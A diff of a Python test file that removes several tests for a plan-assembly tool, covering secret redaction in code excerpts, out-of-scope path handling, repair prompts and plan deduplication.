     ] == [("EXCERPT_ANCHOR_INVALID", "/context_excerpts/0", "lines=2")]
 
-def test_repository_secrets_are_redacted_not_blocked_in_excerpts(repo: Path) -> None:
-    """Spliced repository bytes need redaction after authored-string processing.
-
-    The lowercase secret exercises Improve's rule, which trajectory redaction lacks.
-    """
-    (repo / "apps/catalog/api.py").write_text(
-        '    password = "s3cr3tplaintext"\n'
-        "    return [load_item(item_id) for item_id in item_ids]\n",
-        encoding="utf-8",
-    )
-
-    assembled = _assembled(repo)
-    excerpt = next(item for item in assembled["current_state_excerpts"] if item["path"] == "apps/catalog/api.py")
-    assert excerpt["verbatim_excerpt"] == (
-        "    password = <redacted>\n"
-        "    return [load_item(item_id) for item_id in item_ids]"
-    )
-    assert "s3cr3tplaintext" not in json.dumps(assembled)
 
 def test_assemble_dedups_scope_lists_by_disk_truth(repo: Path) -> None:
     plan = _authored_new_file_plan()
@@ -2244,16 +1764,6 @@ def _injected_out_of_scope(assembled: dict[str, Any], path: str) -> dict[str, An
     assert len(entries) == 1
     return cast(dict[str, Any], entries[0])
 
-def test_undeclared_stop_path_is_declared_out_of_scope_not_blocked(repo: Path) -> None:
-    plan = _authored_plan()
-    plan["false_assumption"]["related_paths"] = ["apps/catalog/api.py", "Makefile",]
-    assembled = _assembled(repo, plan)
-    entry = _injected_out_of_scope(assembled, "Makefile")
-    assert entry["reason"] == ("Referenced by a stop condition for context only; do not create, "
-        "modify, or depend on this path."
-    )
-    assert [entry["path"] for entry in assembled["scope"]["out_of_scope_paths"]] == ["README.md", "Makefile",]
-    assert assembled["stop_conditions"][3]["related_paths"] == ["apps/catalog/api.py", "Makefile",]
 
 def test_deleted_stop_path_is_declared_out_of_scope_without_touching_disk(repo: Path) -> None:
     deleted = "apps/catalog/legacy_loader.py"
@@ -2287,46 +1797,8 @@ def test_out_of_repository_stop_path_stays_blocked_and_is_never_declared(repo: P
         if issue.code == "PATH_OUTSIDE_REPOSITORY"
     ] == ["/false_assumption/related_paths/0"]
 
-def test_already_declared_stop_paths_are_never_duplicated(repo: Path) -> None:
-    plan = _authored_plan()
-    plan["false_assumption"]["related_paths"] = ["README.md", "tests/test_catalog.py", "README.md",]
-    assembled = _assembled(repo, plan)
-    assert assembled["scope"]["out_of_scope_paths"] == [
-        {"path": "README.md", "reason": "Catalog batching does not change user documentation.",}
-    ]
 
-def test_injected_out_of_scope_entry_satisfies_the_authoring_schema(repo: Path) -> None:
-    plan = _authored_plan()
-    plan["false_assumption"]["related_paths"] = ["Makefile"]
-    assembled = _assembled(repo, plan)
-    entry = _injected_out_of_scope(assembled, "Makefile")
-    item_schema = PLAN_AUTHOR_SCHEMA["properties"]["scope"]["properties"]["out_of_scope_paths"]["items"]
-    assert not list(Draft202012Validator(item_schema).iter_errors(entry))
-    assert 20 <= len(entry["reason"]) <= 500
 
-def test_repair_prompt_renders_complete_issue_list_with_hints() -> None:
-    prompt = build_plan_writer_repair_prompt("original writer prompt",
-        [AssemblyIssue("AUTHOR_SCHEMA_INVALID", "/title", "minLength=12;actual=9",
-                ("Rewrite the value at this pointer to at least 12 "
-                    "characters (it has 9); keep every other field unchanged "
-                    "in meaning."
-                ),
-            ),
-            AssemblyIssue("RECON_COMMAND_UNKNOWN", "/steps/0/verification/recon_command_id", None,
-                "valid recon command ids: test-suite, git-diff",
-            ),
-        ],
-    )
-
-    assert prompt.startswith("original writer prompt")
-    assert "AUTHOR_SCHEMA_INVALID" in prompt
-    assert "/title" in prompt
-    assert "minLength=12;actual=9" in prompt
-    assert "at least 12 characters (it has 9)" in prompt
-    assert "RECON_COMMAND_UNKNOWN" in prompt
-    assert "/steps/0/verification/recon_command_id" in prompt
-    assert "valid recon command ids: test-suite, git-diff" in prompt
-    assert "complete replacement object" in prompt
 
 def test_repair_prompt_drops_malformed_detail_segment() -> None:
     prompt = build_plan_writer_repair_prompt(
@@ -2370,29 +1842,6 @@ def test_partial_member_overlap_does_not_suppress_uncovered_work(repo: Path, hea
     assert result["written"][0]["path"] == "002-batch-catalog-queries.md"
     assert len(list(plans_dir.glob("[0-9][0-9][0-9]-*.md"))) == 2
 
-def test_stable_member_alias_reuses_complete_plan_with_stored_package_id(repo: Path, head_sha: str,) -> None:
-    plans_dir = repo / "daydream_plans"
-    original = _finding(fingerprint="pkg-original")
-    original.update({"package_fingerprint": "pkg-original", "member_fingerprints": ["fp-old-wording"],
-            "member_aliases": ["member:stable-concern"],
-        }
-    )
-    _write_plans(plans_dir, [{"finding": original, **_assembled(repo)}], planned_at=head_sha,)
-    reworded = _finding(fingerprint="pkg-current")
-    reworded.update({"package_fingerprint": "pkg-current", "member_fingerprints": ["fp-new-wording"],
-            "member_aliases": ["member:stable-concern"],
-        }
-    )
-
-    result = _write_plans(plans_dir, [{"finding": reworded, **_assembled(repo)}], planned_at=head_sha,)
-
-    assert result["written"] == []
-    assert result["skipped"][0]["number"] == 1
-    assert result["skipped"][0]["path"] == "001-batch-catalog-queries.md"
-    assert result["skipped"][0]["package_fingerprint"] == "pkg-original"
-    assert result["skipped"][0]["member_fingerprints"] == ["fp-old-wording"]
-    assert result["skipped"][0]["member_aliases"] == ["member:stable-concern"]
-    assert result["skipped"][0]["finding"]["package_fingerprint"] == "pkg-current"
 
 def test_colliding_semantic_alias_cannot_cover_two_distinct_current_members(repo: Path, head_sha: str,) -> None:
     plans_dir = repo / "daydream_plans"
@@ -2443,27 +1892,6 @@ def test_ambiguous_partial_member_overlap_is_planned_instead_of_suppressed(repo:
     assert result["skipped"] == []
     assert result["written"][0]["number"] == 3
 
-def test_split_durable_coverage_suppresses_without_stale_plan_path(repo: Path, head_sha: str,) -> None:
-    plans_dir = repo / "daydream_plans"
-
-    def _package(package: str, member: str) -> dict[str, Any]:
-        finding = _finding(fingerprint=package)
-        finding.update({"package_fingerprint": package, "member_fingerprints": [member],})
-        return {"finding": finding, **_assembled(repo)}
-
-    _write_plans(
-        plans_dir, [_package("pkg-first", "fp-first"), _package("pkg-second", "fp-second")], planned_at=head_sha,
-    )
-    combined = _finding(fingerprint="pkg-combined")
-    combined.update({"package_fingerprint": "pkg-combined", "member_fingerprints": ["fp-first", "fp-second"],})
-
-    result = _write_plans(plans_dir, [{"finding": combined, **_assembled(repo)}], planned_at=head_sha,)
-
-    assert result["written"] == []
-    assert len(result["skipped"]) == 1
-    assert "number" not in result["skipped"][0]
-    assert "path" not in result["skipped"][0]
-    assert "package_fingerprint" not in result["skipped"][0]
 
 def test_partial_rejection_does_not_suppress_uncovered_package_member(repo: Path, head_sha: str,) -> None:
     plans_dir = repo / "daydream_plans"
@@ -2575,12 +2003,6 @@ def test_reanchored_report_section_lists_rows(repo: Path, head_sha: str) -> None
     assert "Fix N+1 catalog queries" in section
     assert expected_rel in section
 
-def test_reanchored_report_section_empty(tmp_path: Path) -> None:
-    plans_dir = tmp_path / "daydream_plans"
-    plans_dir.mkdir(parents=True)  # no .index.json
-    section = _reanchored_report_section(plans_dir)
-    assert "## Re-anchored plans" in section
-    assert "No re-anchored plans" in section
 
 def test_reanchored_failure_releases_worktree_lock(repo: Path, head_sha: str, monkeypatch: pytest.MonkeyPatch,) -> None:
     _advance_head(repo)
@@ -2640,5 +2062,3 @@ def test_stale_locked_reanchor_worktree_is_reclaimed(repo: Path) -> None:
     assert removed == 1
     assert not stale.exists()
     assert "run-dead-reanchor" not in git(repo, "worktree", "list")
-
-
